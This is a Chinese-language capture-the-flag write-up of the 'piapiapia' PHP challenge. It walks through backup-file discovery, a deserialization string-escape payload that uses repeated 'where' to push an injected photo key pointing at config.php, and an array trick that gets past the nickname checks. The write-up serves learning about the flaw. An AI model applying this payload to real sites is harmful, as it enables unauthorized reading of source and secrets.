主页面首先是一只名为piapiapia.gif的小猫动图，也是题目名字来源。下面是用户名密码的登录框。

尝试各种sql注入，但是只有invalid user name or password响应。没有展示源码，响应也没有消息头提示。这时候就要目录扫描了。一般注意的是:git源码，robots.txt，网站备份文件

用御剑啥也扫不出来，这软件真不行吧。还是换回最爱的dirsearch

![image-20250911154102353](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250911154102353.png)

这是用备份字典扫出来的，浏览器访问下载一下：

![image-20250911154151933](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250911154151933.png)

一共有这几个文件，大概逻辑如下：

1. 在register.php输入用户名密码注册
2. 在index.php凭借用户名密码登录
3. 在update.php填写个人信息，包括电话，邮箱，名字和上传一张头像
4. 在profile.php展示你填写的信息

关键漏洞代码：

update.php中：

```php
$profile['photo'] = 'upload/' . md5($file['name']);
...
$user->update_profile($username, serialize($profile));
```

profile.php中：

```php
$profile=$user->show_profile($username);
...
$profile = unserialize($profile);
...
$photo = base64_encode(file_get_contents($profile['photo']));
```

```html
<img src="data:image/gif;base64,<?php echo $photo; ?>
```

一看到serilize，就想到反序列化漏洞。再看到file_get_contents，基本思路就确定了。config.php中提示了flag就在其中，我们的目标就是读取config.php.一般读取php文件是要用php://filter进行base64编码，不然echo的时候会被当php代码直接。但是这里题目已经帮你进行了base64编码，所以我们直接让photo的值为config.php即可。

接下来的问题是怎么变？反序列化之前赋值是`$profile['photo'] = 'upload/' . md5($file['name']);`我们怎么甩开upload这个前缀呢？

在class.php中，我们找到了一个过滤函数：

```php
public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
```

这里发现了 `preg_replace()`这对字符串进行替换。和反序列化一结合，很容易想到反序列化的字符逃逸：因为过滤时增加或减少了字符导致部分字符逃逸。看看update_profile方法，果然调用了filter函数过滤序列化后的字符串

```php
public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
```

过滤函数中where->hacker增加了1个字符。我们在photo前一个键的值写入大量where和我们要的photo键值，这样字符增加后，我们要的photo键值就逃逸了出来，顶掉了后面正常的photo值。具体如下：

```php
a:4{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";s:8:"nickname";s:6:"orange";s:5:"photo";s:39:"upload/f3ccdd27d2000e3f9255a7e3e2c48800";}
```

这是正常的序列化字符串，我们要在nickname的值处进行构造，nickname=`where*33+ ";s:5:"photo";s:10:"config.php";}`

然后序列化文件如下：

```php
a:4{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";
s:8:"nickname";s:198:" where*33 ";s:5:"photo";s:10:"config.php";}        
";s:5:"photo";s:39:"upload/f3ccdd27d2000e3f9255a7e3e2c48800";}
```

过滤后where变成hacker，那么nickname的值的长度198就只能管到刚好最后一个hacker，将后面的`"`认为字符串的结束，并且把剩余内容当作photo的键值对。因为`;}`闭合了这个序列化字符串，后面原本的photo键值对就被忽略了。

我们尝试一下：

![image-20250911193906471](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250911193906471.png)

发现nickname违规！查看源码看看对nickname的检验：

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
	die('Invalid nickname');
```

我们可以利用数组绕过。`preg_match`和`strlen`函数的参数如果是一个**数组**，会返回`FALSE`并产生一个警告（Warning），但不会停止执行。因为是数组，所以nikname的序列化字符串会不一样，它的值会变成一个数组，如下：

```php
s:8:"nickname"; a:1:{i:0; s:198:" where*33 ";s:5:"photo";s:10:"config.php";} ........
```

为了闭合`a:1:{i:0;`中的`{`,我们需要一个`}`,因此nickname=`where*34+ ";}s:5:"photo";s:10:"config.php";}`

多了一个字符，因此where也要多一个，再次尝试：

![image-20250911200432327](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250911200432327.png)

上传成功！去profile.php查看base64编码后的内容，解码即可

![image-20250911200627182](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250911200627182.png)
